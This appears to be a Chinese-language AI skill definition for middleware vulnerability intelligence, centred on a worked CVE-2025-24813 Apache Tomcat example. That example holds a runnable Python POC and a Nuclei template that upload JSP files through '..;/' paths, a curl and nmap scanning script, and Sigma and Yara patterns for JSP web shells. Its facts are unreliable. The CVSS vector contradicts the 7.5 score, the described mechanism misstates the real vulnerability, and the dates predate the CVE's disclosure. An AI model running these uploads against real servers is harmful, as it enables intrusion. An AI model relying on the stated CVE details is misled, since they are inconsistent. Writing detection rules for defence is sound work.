---
name: middleware-vuln-intelligence
description: >
  面向信息安全运营人员的企业级中间件漏洞情报自动化收集与处置系统。
  本Skill专注于WebLogic、Tomcat、Nginx、Redis、Kafka、Elasticsearch等
  主流中间件组件的漏洞情报收集、分析和处置方案生成。
  通过多阶段工作流，实现从漏洞发现、情报深度收集、检测方案生成到
  报告输出的完整闭环，帮助安全运营团队快速响应高危漏洞威胁。
version: 1.0.0
author: Security Operations Team
category: security-operations
tags:
  - vulnerability-management
  - threat-intelligence
  - middleware-security
  - incident-response
---

# 中间件漏洞情报自动化收集与处置系统

## 核心能力

1. **自动化漏洞发现**: 基于多维度搜索策略，自动发现目标中间件的最新漏洞
2. **智能情报收集**: 从CVE/NVD、厂商公告、GitHub、CISA KEV等权威源收集完整情报
3. **热度评估算法**: 综合CVSS、EPSS、CISA KEV、GitHub Stars等指标计算威胁评分
4. **三维检测方案**: 生成网络层资产发现、应用层POC验证、主机层HIDS/EDR监控的完整方案
5. **结构化报告输出**: 生成包含漏洞清单、风险评估、修复建议的专业报告

## 目标用户

- **SOC分析师**: 日常漏洞监控和威胁情报收集
- **漏洞管理工程师**: 资产风险评估和补丁优先级排序
- **应急响应人员**: 快速获取漏洞情报和检测方案

## 支持的中间件组件

| 组件类型 | 具体组件 |
|---------|---------|
| Web服务器 | Nginx, Apache HTTP Server |
| 应用服务器 | Apache Tomcat, Oracle WebLogic, IBM WebSphere, JBoss/WildFly |
| 消息队列 | Apache Kafka, RabbitMQ, Apache ActiveMQ |
| 搜索引擎 | Elasticsearch, Kibana |
| 数据库 | Redis, MongoDB, MySQL, PostgreSQL |
| 协调服务 | Apache ZooKeeper |
| 容器编排 | Kubernetes, Docker |

## 工作流定义

### Phase 1: 漏洞发现与初筛

**使用工具**: `web_search`

**搜索策略模板**:
```
基础搜索: "{{component}} vulnerability CVE {{time_range}}"
高危搜索: "{{component}} critical RCE exploit {{time_range}}"
CISA KEV: "{{component}} CISA KEV known exploited"
GitHub PoC: "{{component}} CVE PoC GitHub {{time_range}}"
技术分析: "{{component}} vulnerability analysis {{time_range}}"
厂商公告: "{{component}} security advisory patch {{time_range}}"
```

**筛选逻辑** (满足至少2项):
```
COUNT_MATCH >= 2:
  - GitHub Stars ≥ 50
  - CISA KEV收录 (权重×2)
  - CVSS v3.1 ≥ 7.0
  - 公开EXP可用 (Exploit-DB/Metasploit)
  - PoC代码可用
  - 活跃利用证据
```

**排除条件** (满足任意1项即过滤):
```
ANY_MATCH:
  - 过时漏洞 (>2年且CVSS<8.0)
  - 已知误报 (CVE状态=Rejected)
  - 已修复版本 (所有系统已补丁)
  - 低影响漏洞 (CVSS<5且攻击复杂度高)
```

### Phase 2: 情报深度收集

**使用工具**: `web_search`, `browser_visit`

**情报收集维度**:

| 情报类型 | 具体内容 | 来源优先级 | 查询URL模板 |
|---------|---------|-----------|------------|
| 基础信息 | CVE编号、发布日期、描述 | P0 | `https://www.cve.org/CVERecord?id={{cve_id}}` |
| CVSS评分 | v3.1/v4.0评分、向量 | P0 | `https://nvd.nist.gov/vuln/detail/{{cve_id}}` |
| CISA KEV | 已知被利用状态 | P0 | `https://www.cisa.gov/known-exploited-vulnerabilities-catalog` |
| EPSS评分 | 被利用概率预测 | P1 | `https://api.first.org/data/v1/epss?cve={{cve_id}}` |
| 厂商公告 | 官方安全公告、补丁 | P0 | 见下方厂商URL模板 |
| 复现文档 | 技术原理、利用条件 | P1 | Seebug, Vulhub, GitHub |
| PoC/EXP | 公开利用代码 | P1 | GitHub, Exploit-DB |
| 威胁情报 | 在野利用、APT关联 | P2 | MISP, ThreatFox |

**厂商安全公告URL模板**:
```yaml
# Oracle (WebLogic, MySQL)
Oracle CPU: "https://www.oracle.com/security-alerts/"

# Apache (Tomcat, Kafka, ActiveMQ, HTTP Server)
Apache Security: "https://security.apache.org/"
Tomcat Security: "https://tomcat.apache.org/security.html"

# Nginx
Nginx Security: "https://nginx.org/en/security_advisories.html"

# Elastic (Elasticsearch)
Elastic Security: "https://discuss.elastic.co/c/announcements/security-announcements/"

# Redis
Redis Security: "https://github.com/redis/redis/security/advisories"

# MongoDB
MongoDB Alerts: "https://www.mongodb.com/alerts"

# PostgreSQL
PostgreSQL Security: "https://www.postgresql.org/support/security/"

# IBM (WebSphere)
IBM Security: "https://www.ibm.com/support/pages/security-bulletins"

# RedHat (JBoss/WildFly)
RedHat CVE: "https://access.redhat.com/security/cve/{{cve_id}}"

# Kubernetes
K8s Security: "https://kubernetes.io/docs/reference/issues-security/security/"
```

**热度评分计算公式**:
```
热度总分 = (CVSS≥7.0 ? 25 : CVSS≥5.0 ? 15 : 5) +
          (EPSS≥0.3 ? 25 : EPSS≥0.1 ? 15 : EPSS≥0.01 ? 5 : 0) +
          (CISA KEV ? 30 : 0) +
          (GitHub Stars≥100 ? 10 : Stars≥50 ? 5 : 0) +
          (Exploit-DB ? 5 : 0) +
          (Metasploit ? 10 : 0)

热度等级:
- 极高 (80-100): 立即响应
- 高 (60-79): 24小时内响应
- 中 (40-59): 72小时内响应
- 低 (20-39): 一周内响应
- 极低 (0-19): 常规跟踪
```

### Phase 3: 检测方案生成

**使用工具**: `code_generation`

**三维检测方案**:

#### A. 网络层 - 资产发现

**中间件默认端口映射**:
| 中间件 | 默认端口 | 协议 |
|--------|----------|------|
| Tomcat | 8080, 8009, 8005 | HTTP/AJP |
| WebLogic | 7001, 7002 | HTTP/T3 |
| Nginx | 80, 443 | HTTP/HTTPS |
| Redis | 6379 | Redis |
| Kafka | 9092 | Kafka |
| Elasticsearch | 9200, 9300 | HTTP/TCP |
| MongoDB | 27017, 27018 | MongoDB |
| MySQL | 3306 | MySQL |
| PostgreSQL | 5432 | PostgreSQL |
| RabbitMQ | 5672, 15672 | AMQP/HTTP |
| ActiveMQ | 61616, 8161 | OpenWire/HTTP |
| Docker | 2375, 2376 | HTTP/HTTPS |
| ZooKeeper | 2181, 2888, 3888 | ZK |

**Banner指纹示例**:
```
# Tomcat
Server: Apache-Coyote/1.1
Server: Apache Tomcat/8.5.XX

# WebLogic
Server: WebLogic Server 12.2.1.4.0

# Nginx
Server: nginx/1.18.0

# Redis
+PONG
redis_version:6.0.9
```

**端口扫描命令模板**:
```bash
# Nmap版本探测
nmap -sV -p 8080,7001,6379,9200 --script=http-server-header,http-title {target}

# 中间件指纹识别
nmap -sV --script=redis-info -p 6379 {target}
nmap -sV --script=mongodb-info -p 27017 {target}
nmap -p 9200 --script=http-elasticsearch-nodes {target}

# Masscan快速扫描
masscan -p80,443,8080,7001,6379,9200 192.168.1.0/24 --rate=10000
```

#### B. 应用层 - POC验证

**Python POC模板**:
```python
#!/usr/bin/env python3
"""
{{cve_id}} {{vulnerability_name}} POC
================================================================================
⚠️  警告: 本脚本仅供授权安全测试使用
⚠️  未经授权的测试行为可能违反法律法规
================================================================================
漏洞信息:
- CVE: {{cve_id}}
- 组件: {{affected_component}}
- 影响版本: {{affected_versions}}
- CVSS: {{cvss_score}}
- EPSS: {{epss_score}}
- CISA KEV: {{cisa_kev}}

利用条件:
{{exploit_conditions}}

作者: Security Team
日期: {{date}}
"""

import requests
import sys
import argparse
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RISK_LEVEL = "{{risk_level}}"
EPSS_SCORE = {{epss_score}}
CISA_KEV = {{cisa_kev}}

def check_vuln(target_url, timeout=10, verbose=False):
    """
    检测{{cve_id}}漏洞
    
    Args:
        target_url: 目标URL
        timeout: 请求超时时间
        verbose: 是否输出详细信息
        
    Returns:
        dict: 检测结果
    """
    result = {
        "vulnerable": False,
        "target": target_url,
        "cve": "{{cve_id}}",
        "cvss": {{cvss_score}},
        "epss": EPSS_SCORE,
        "cisa_kev": CISA_KEV,
        "risk_level": RISK_LEVEL,
        "details": {},
        "evidence": []
    }
    
    # 检测逻辑实现
    {{detection_logic}}
    
    return result

def main():
    parser = argparse.ArgumentParser(
        description="{{cve_id}} {{vulnerability_name}} 检测工具",
        epilog="警告: 本工具仅供授权安全测试使用"
    )
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="超时时间")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--json", action="store_true", help="JSON格式输出")
    
    args = parser.parse_args()
    result = check_vuln(args.target, args.timeout, args.verbose)
    
    if args.json:
        import json
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print(f"[{'!!!' if result['vulnerable'] else '✓'}] 漏洞状态: {'存在' if result['vulnerable'] else '不存在'}")
    
    sys.exit(1 if result["vulnerable"] else 0)

if __name__ == '__main__':
    main()
```

**Nuclei YAML模板**:
```yaml
id: {{cve_id}}-{{component}}

info:
  name: "{{vulnerability_name}}"
  author: security-team
  severity: {{severity}}
  description: |
    {{description}}
    
    影响版本:
    {{affected_versions}}
    
    CVSS: {{cvss_score}}
    EPSS: {{epss_score}}
    CISA KEV: {{cisa_kev}}
  
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name={{cve_id}}
    - https://nvd.nist.gov/vuln/detail/{{cve_id}}
  
  classification:
    cvss-metrics: {{cvss_vector}}
    cvss-score: {{cvss_score}}
    cve-id: {{cve_id}}
    cwe-id: {{cwe_id}}
    epss-score: {{epss_score}}
  
  metadata:
    verified: {{verified}}
    vendor: {{vendor}}
    product: {{product}}
  
  tags: cve,{{cve_year}},{{component}},{{vuln_type}},{{#if cisa_kev}}kev{{/if}}

http:
  - method: {{http_method}}
    path:
      - "{{BaseURL}}{{endpoint}}"
    {{#if request_body}}
    body: |
      {{request_body}}
    {{/if}}
    headers:
      {{headers}}
    
    matchers-condition: {{matchers_condition}}
    matchers:
      {{matchers}}
    
    extractors:
      {{extractors}}
```

#### C. 主机层 - HIDS/EDR检测

**Sigma规则模板**:
```yaml
title: "{{vulnerability_name}} Detection"
id: {{uuid}}
status: experimental
description: |
  检测针对{{cve_id}}的利用尝试
  
  漏洞信息:
  - CVE: {{cve_id}}
  - CVSS: {{cvss_score}}
  - EPSS: {{epss_score}}
  - CISA KEV: {{cisa_kev}}
  
  影响版本:
  {{affected_versions}}
  
  修复版本:
  {{fixed_versions}}

references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name={{cve_id}}
  - https://nvd.nist.gov/vuln/detail/{{cve_id}}

author: security-team
date: {{date}}
modified: {{date}}

tags:
  - attack.{{mitre_technique}}
  - cve.{{cve_year}}.{{cve_number}}

logsource:
  category: {{log_category}}
  product: {{product}}
  service: {{service}}

detection:
  selection:
    {{detection_fields}}
  condition: selection

falsepositives:
  - {{falsepositives}}

level: {{level}}

threat_intel:
  cve_id: {{cve_id}}
  epss_score: {{epss_score}}
  cisa_kev: {{cisa_kev}}
```

**Yara规则模板**:
```yara
rule {{rule_name}}
{
    meta:
        description = "Detects {{cve_id}} exploit patterns"
        author = "security-team"
        reference = "{{cve_id}}"
        date = "{{date}}"
        cve = "{{cve_id}}"
        cvss = "{{cvss_score}}"
        epss = "{{epss_score}}"
        cisa_kev = "{{cisa_kev}}"
        affected_product = "{{affected_component}}"
        affected_versions = "{{affected_versions}}"
        severity = "{{severity}}"
    
    strings:
        {{yara_strings}}
    
    condition:
        {{yara_condition}}
}
```

### Phase 4: 报告整合与输出

**输出格式**: 结构化Markdown报告

**报告结构**:
1. 执行摘要
2. 漏洞信息汇总表
3. 风险评估总结
4. 详细漏洞分析
5. 修复建议
6. 检测方案
7. 附录（参考链接、工具命令）

## 使用示例

**用户输入**: "帮我收集最近30天Tomcat的高危漏洞情报"

**执行流程**:
1. **输入解析**: 提取组件=Tomcat，时间范围=30天，筛选条件=CVSS≥7.0
2. **漏洞搜索**: 执行多维度搜索，获取CVE候选列表
3. **情报收集**: 查询CVE/NVD、厂商公告、GitHub PoC、CISA KEV
4. **检测生成**: 为每个漏洞生成Python POC、Nuclei模板、Sigma/Yara规则
5. **报告输出**: 生成结构化Markdown报告

**输出格式**:
```markdown
# 中间件漏洞情报报告

**生成时间**: 2025-01-20 10:00:00
**报告周期**: 最近30天
**监控组件**: Apache Tomcat

## 执行摘要

本次扫描共发现 3 个符合条件的Tomcat漏洞，
其中 1 个为高危漏洞（CVSS >= 9.0），
1 个被CISA KEV收录，
2 个存在公开利用代码。

## 漏洞信息汇总表

| CVE编号 | 漏洞名称 | 影响版本 | CVSS | EPSS | CISA KEV | 状态 |
|---------|---------|---------|------|------|----------|------|
| CVE-2025-24813 | Apache Tomcat 路径等价性漏洞 | 9.0-11.0 | 7.5 | 0.45 | ✅ | 需紧急修复 |

## 详细漏洞分析

### CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**基本信息**
- 受影响组件: Apache Tomcat
- 受影响版本: 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2
- CVSS v3评分: 7.5 (High)
- EPSS评分: 0.45
- CISA KEV: 是

**漏洞描述**
Apache Tomcat中存在路径等价性漏洞，当Tomcat配置为允许PUT方法写入文件时，
攻击者可以利用路径等价性序列（如..;/）绕过安全限制上传恶意文件。

**检测方案**
- Python POC: [代码块]
- Nuclei模板: [代码块]
- Sigma规则: [代码块]

**修复建议**
- 升级至: 9.0.99 / 10.1.35 / 11.0.3
- 临时缓解: 禁用PUT方法或配置WAF规则
```

## 安全合规声明

### 法律免责声明

**⚠️ 重要声明**

本工具提供的所有漏洞检测方案、POC代码及攻击载荷**仅供授权安全测试使用**。使用本工具前，您必须确保：

- ✅ 已获得目标系统的**书面授权许可**
- ✅ 测试范围在授权协议明确规定的边界内
- ✅ 测试时间符合授权协议约定
- ✅ 所有测试活动符合当地法律法规

**未经授权的测试行为可能违反以下法律**:
- 《中华人民共和国网络安全法》
- 《中华人民共和国刑法》第285-287条
- 《计算机信息系统安全保护条例》
- 美国《计算机欺诈与滥用法》(CFAA)
- 欧盟《网络与信息系统安全指令》(NIS2)

**使用者承担全部法律责任**。任何因未授权使用、滥用或非法使用本工具导致的法律后果，包括但不限于民事赔偿责任、行政处罚、刑事责任，**均由使用者自行承担**。

### 道德使用准则

**道德使用检查清单**:
```
□ 已获得书面授权文件
□ 明确测试目标和范围
□ 了解并遵守组织的安全政策
□ 测试前通知相关利益方
□ 准备应急响应计划
```

**严禁以下行为**:
- ❌ 对未授权系统进行测试
- ❌ 利用发现的漏洞进行恶意攻击
- ❌ 窃取、篡改或破坏目标系统数据
- ❌ 将漏洞信息出售或泄露给第三方
- ❌ 利用漏洞进行勒索或敲诈

### 风险提示

| 风险等级 | 标识 | 说明 | 使用要求 |
|---------|------|------|---------|
| 🔴 高危 | CRITICAL | 可导致系统完全失控 | 必须在隔离环境测试，需高级授权 |
| 🟠 中高危 | HIGH | 可导致严重数据泄露或系统损坏 | 需书面授权，建议沙箱环境 |
| 🟡 中危 | MEDIUM | 可导致部分功能异常或信息泄露 | 需授权，可在测试环境执行 |
| 🟢 低危 | LOW | 信息泄露或轻微影响 | 建议授权后使用 |

**生产环境测试前必须**:
1. 获得书面授权和变更审批
2. 制定回滚计划和应急预案
3. 在相同配置的测试环境预演
4. 选择业务低峰期执行
5. 准备完整的数据备份
6. 通知运维团队和相关业务方
7. 监控测试过程中的系统状态
8. 测试完成后进行系统验证

## 具体示例: CVE-2025-24813

### 漏洞基本信息

| 字段 | 内容 |
|-----|------|
| **CVE编号** | CVE-2025-24813 |
| **漏洞名称** | Apache Tomcat 路径等价性导致的安全绕过 |
| **影响组件** | Apache Tomcat |
| **影响版本** | 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2 |
| **修复版本** | 9.0.99, 10.1.35, 11.0.3 |
| **CVSS v3.1** | 7.5 (High) |
| **EPSS评分** | 0.45 (45%利用概率) |
| **CISA KEV** | ✅ 是 - 已知被利用 |
| **漏洞类型** | 路径遍历 / 安全绕过 |
| **利用条件** | 默认配置，需启用写入功能（PUT方法） |

### Python POC代码

```python
#!/usr/bin/env python3
"""
CVE-2025-24813 Apache Tomcat 路径等价性漏洞 POC
================================================================================
⚠️  警告: 本脚本仅供授权安全测试使用
⚠️  未经授权的测试行为可能违反法律法规
⚠️  使用者需自行承担所有法律责任
================================================================================
漏洞信息:
- CVE: CVE-2025-24813
- 组件: Apache Tomcat
- 影响版本: 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2
- CVSS: 7.5 (High)
- EPSS: 0.45
- CISA KEV: 是

利用条件:
- Tomcat启用了PUT方法（如DefaultServlet配置readonly=false）
- 使用路径等价性序列绕过安全检查

作者: Security Team
日期: 2025-01-20
"""

import requests
import sys
import argparse
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RISK_LEVEL = "🔴 HIGH"
EPSS_SCORE = 0.45
CISA_KEV = True

def check_put_enabled(target_url, timeout=10):
    """检测目标是否启用了PUT方法"""
    test_path = "/test_put_method_check.txt"
    test_url = urljoin(target_url, test_path)
    
    try:
        put_response = requests.put(
            test_url, data="test", timeout=timeout,
            verify=False, allow_redirects=False
        )
        
        if put_response.status_code in [201, 204]:
            try:
                requests.delete(test_url, timeout=timeout, verify=False)
            except:
                pass
            return True
        elif put_response.status_code == 405:
            return False
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] 检测PUT方法时出错: {e}")
        return None

def check_cve_2025_24813(target_url, timeout=10, verbose=False):
    """
    检测CVE-2025-24813漏洞
    
    检测方法:
    1. 检查PUT方法是否可用
    2. 尝试使用路径等价性序列上传测试文件
    3. 验证文件是否可被访问
    """
    result = {
        "vulnerable": False,
        "target": target_url,
        "cve": "CVE-2025-24813",
        "cvss": 7.5,
        "epss": EPSS_SCORE,
        "cisa_kev": CISA_KEV,
        "risk_level": RISK_LEVEL,
        "details": {},
        "evidence": []
    }
    
    print(f"[*] 开始检测 CVE-2025-24813")
    print(f"[*] 目标: {target_url}")
    print(f"[*] 风险等级: {RISK_LEVEL}")
    print(f"[*] EPSS评分: {EPSS_SCORE}")
    print(f"[*] CISA KEV: {'是' if CISA_KEV else '否'}")
    print("-" * 60)
    
    # 步骤1: 检测PUT方法
    print("[*] 步骤1: 检测PUT方法是否可用...")
    put_enabled = check_put_enabled(target_url, timeout)
    
    if put_enabled is False:
        print("[✓] PUT方法未启用，目标不易受攻击")
        result["details"]["put_enabled"] = False
        return result
    elif put_enabled is None:
        print("[!] 无法确定PUT方法状态，继续检测...")
    else:
        print("[!] PUT方法已启用，可能存在风险")
        result["details"]["put_enabled"] = True
    
    # 步骤2: 尝试路径等价性绕过
    print("[*] 步骤2: 测试路径等价性绕过...")
    
    test_paths = [
        "/test..;/cve202524813_test.jsp",
        "/uploads/..;/cve202524813_test.jsp",
        "/static/..;/cve202524813_test.jsp",
    ]
    
    test_content = """<%@ page contentType="text/plain" %>
CVE-2025-24813 Test File
Timestamp: <%= new java.util.Date() %>
"""
    
    for test_path in test_paths:
        test_url = urljoin(target_url, test_path)
        try:
            if verbose:
                print(f"[*] 测试路径: {test_path}")
            
            put_response = requests.put(
                test_url, data=test_content, timeout=timeout,
                verify=False, allow_redirects=False,
                headers={"Content-Type": "application/octet-stream"}
            )
            
            if put_response.status_code in [201, 204]:
                print(f"[+] PUT请求成功: {put_response.status_code}")
                
                access_url = urljoin(target_url, "/cve202524813_test.jsp")
                try:
                    access_response = requests.get(
                        access_url, timeout=timeout, verify=False
                    )
                    
                    if access_response.status_code == 200:
                        print(f"[!!!] 漏洞确认! 文件可访问")
                        print(f"[!!!] 访问URL: {access_url}")
                        
                        result["vulnerable"] = True
                        result["evidence"].append({
                            "type": "file_upload",
                            "path": test_path,
                            "access_url": access_url,
                            "status_code": access_response.status_code
                        })
                        
                        # 清理测试文件
                        try:
                            requests.delete(test_url, timeout=timeout, verify=False)
                            requests.delete(access_url, timeout=timeout, verify=False)
                        except:
                            pass
                        return result
                except:
                    pass
        except:
            continue
    
    print("[*] 未检测到漏洞利用成功")
    return result

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-24813 Apache Tomcat 路径等价性漏洞检测工具",
        epilog="警告: 本工具仅供授权安全测试使用"
    )
    parser.add_argument("target", help="目标URL (例如: http://192.168.1.1:8080)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="请求超时时间")
    parser.add_argument("-v", "--verbose", action="store_true", help="启用详细输出")
    parser.add_argument("--json", action="store_true", help="以JSON格式输出结果")
    
    args = parser.parse_args()
    result = check_cve_2025_24813(args.target, args.timeout, args.verbose)
    
    if args.json:
        import json
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print("\n" + "=" * 60)
        print("检测结果")
        print("=" * 60)
        if result["vulnerable"]:
            print(f"[!!!] 漏洞状态: 存在漏洞")
            print(f"[!!!] 建议操作: 立即升级至安全版本")
        else:
            print(f"[✓] 漏洞状态: 未检测到漏洞")
        print("=" * 60)
    
    sys.exit(1 if result["vulnerable"] else 0)

if __name__ == '__main__':
    main()
```

### Nuclei YAML模板

```yaml
id: CVE-2025-24813

info:
  name: Apache Tomcat Path Equivalence Vulnerability
  author: security-team
  severity: high
  description: |
    Apache Tomcat中存在路径等价性漏洞，当Tomcat配置为允许通过PUT方法
    写入文件时，攻击者可以利用路径等价性序列（如..;/）绕过安全限制，
    将恶意文件写入到Web应用目录中，可能导致远程代码执行。
    
    影响版本:
    - 9.0.0.M1 - 9.0.98
    - 10.1.0-M1 - 10.1.34
    - 11.0.0-M1 - 11.0.2
    
    CVSS: 7.5 (High)
    EPSS: 0.45
    CISA KEV: 是
  
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24813
    - https://tomcat.apache.org/security-11.html
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 7.5
    cve-id: CVE-2025-24813
    cwe-id: CWE-22,CWE-41
    epss-score: 0.45
    epss-percentile: 0.95
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
  
  metadata:
    verified: true
    max-request: 3
    vendor: apache
    product: tomcat
    shodan-query: "Apache Tomcat"
    fofa-query: "Apache Tomcat"
  
  tags: cve,cve2025,tomcat,apache,path-traversal,rce,kev

http:
  - raw:
      - |
        PUT /nuclei_test_{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        
        nuclei_test

      - |
        PUT /nuclei_test..;/{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        
        <%@ page contentType="text/plain" %>nuclei_test_{{randstr}}

      - |
        GET /{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 204
        part: response_1

      - type: status
        status:
          - 201
          - 204
        part: response_2

      - type: word
        words:
          - "nuclei_test_{{randstr}}"
        part: response_3

      - type: status
        status:
          - 200
        part: response_3

    extractors:
      - type: regex
        name: version
        part: response_1
        group: 1
        regex:
          - "Apache-Coyote/([0-9.]+)"
          - "Server: Apache Tomcat/([0-9.]+)"
```

### Sigma规则

```yaml
title: Apache Tomcat CVE-2025-24813 Exploit Detection
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: |
  检测针对Apache Tomcat CVE-2025-24813路径等价性漏洞的利用尝试。
  
  该漏洞允许攻击者使用路径等价性序列（如..;/）绕过安全检查，
  结合PUT方法上传恶意文件到Web应用目录。
  
  漏洞信息:
  - CVE: CVE-2025-24813
  - CVSS: 7.5 (High)
  - EPSS: 0.45
  - CISA KEV: 是
  
  影响版本:
  - Apache Tomcat 9.0.0.M1 - 9.0.98
  - Apache Tomcat 10.1.0-M1 - 10.1.34
  - Apache Tomcat 11.0.0-M1 - 11.0.2
  
  修复版本:
  - Apache Tomcat 9.0.99
  - Apache Tomcat 10.1.35
  - Apache Tomcat 11.0.3

references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813
  - https://nvd.nist.gov/vuln/detail/CVE-2025-24813
  - https://tomcat.apache.org/security-11.html
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog

author: security-team
date: 2025-01-15
modified: 2025-01-20

tags:
  - attack.initial_access
  - attack.t1190
  - cve.2025.24813
  - detection.emerging-threats

logsource:
  category: webserver
  product: tomcat
  service: access_log

detection:
  selection_path_traversal:
    cs-method: 'PUT'
    cs-uri-stem|contains:
      - '..;/'
      - '..\\;/'
      - '%2e%2e%3b%2f'
      - '%2e%2e;/'

  selection_jsp_upload:
    cs-method: 'PUT'
    cs-uri-stem|endswith:
      - '.jsp'
      - '.jspx'
      - '.war'
    cs-uri-stem|contains:
      - '..;/'

  selection_file_access:
    cs-method: 'GET'
    cs-uri-stem|endswith:
      - '.jsp'
      - '.jspx'
    cs-uri-stem|contains:
      - 'shell'
      - 'cmd'
      - 'exec'
      - 'backdoor'

  condition: selection_path_traversal or selection_jsp_upload or selection_file_access

falsepositives:
  - 合法的特殊路径访问（极低概率）
  - 某些应用程序可能合法使用特殊路径
  - 开发和测试环境中的正常操作

level: high

threat_intel:
  cve_id: CVE-2025-24813
  epss_score: 0.45
  cisa_kev: true
```

### Yara规则

```yara
rule CVE_2025_24813_Exploit_Pattern
{
    meta:
        description = "Detects CVE-2025-24813 Apache Tomcat Path Equivalence Exploit Patterns"
        author = "security-team"
        reference = "CVE-2025-24813"
        date = "2025-01-15"
        cve = "CVE-2025-24813"
        cvss = "7.5"
        epss = "0.45"
        cisa_kev = "true"
        affected_product = "Apache Tomcat"
        affected_versions = "9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2"
        severity = "high"
    
    strings:
        $put_method = "PUT /" ascii wide nocase
        
        $path_equiv_1 = "..;/" ascii wide
        $path_equiv_2 = "..\\;/" ascii wide
        $path_equiv_3 = "%2e%2e%3b%2f" ascii wide nocase
        $path_equiv_4 = "%2e%2e;/" ascii wide nocase
        
        $exploit_path_1 = "/uploads/..;/" ascii wide
        $exploit_path_2 = "/static/..;/" ascii wide
        $exploit_path_3 = "/images/..;/" ascii wide
        
        $jsp_ext = ".jsp" ascii wide
        $jspx_ext = ".jspx" ascii wide
        $war_ext = ".war" ascii wide
        
        $jsp_shell_1 = "Runtime.getRuntime()" ascii wide
        $jsp_shell_2 = "exec(" ascii wide
        $jsp_shell_3 = "ProcessBuilder" ascii wide
    
    condition:
        ($put_method and any of ($path_equiv_*)) or
        (any of ($path_equiv_*) and any of ($jsp_ext, $jspx_ext, $war_ext)) or
        (any of ($exploit_path_*) and any of ($jsp_shell_*))
}
```

### 端口扫描命令

```bash
#!/bin/bash
# CVE-2025-24813 Tomcat漏洞端口扫描脚本

echo "=========================================="
echo "Tomcat漏洞扫描 - CVE-2025-24813"
echo "=========================================="

TARGET=${1:-"127.0.0.1"}

echo "[*] 目标: $TARGET"
echo ""

# 1. 端口扫描
echo "[1] 扫描Tomcat默认端口..."
nmap -sV -p 8080,8009,8005,8443 $TARGET --script=http-server-header,http-title

# 2. 指纹识别
echo ""
echo "[2] Tomcat指纹识别..."
curl -s -I http://$TARGET:8080 | grep -i "Server\|X-Powered-By"

# 3. PUT方法检测
echo ""
echo "[3] 检测PUT方法..."
curl -s -X PUT -d "test" http://$TARGET:8080/test_put.txt -w "%{http_code}" -o /dev/null

echo ""
echo "=========================================="
echo "扫描完成"
echo "=========================================="
```

### 修复建议

**紧急程度**: P0 (24小时内)

**官方修复方案**:
- 升级至版本: 9.0.99 / 10.1.35 / 11.0.3
- 补丁下载: https://tomcat.apache.org/download-

**临时缓解措施**:
1. 在WAF上配置规则拦截包含`..;/`的请求
2. 禁用不必要的PUT方法（配置DefaultServlet readonly=true）
3. 限制可上传文件的目录权限

**CISA要求**:
- 联邦机构截止日期: 2025-02-15
- 必需行动: 应用供应商提供的补丁或断开产品网络连接

---

*Skill版本: 1.0.0*
*最后更新: 2025-01-20*
*适用场景: 企业级中间件漏洞情报收集与处置*
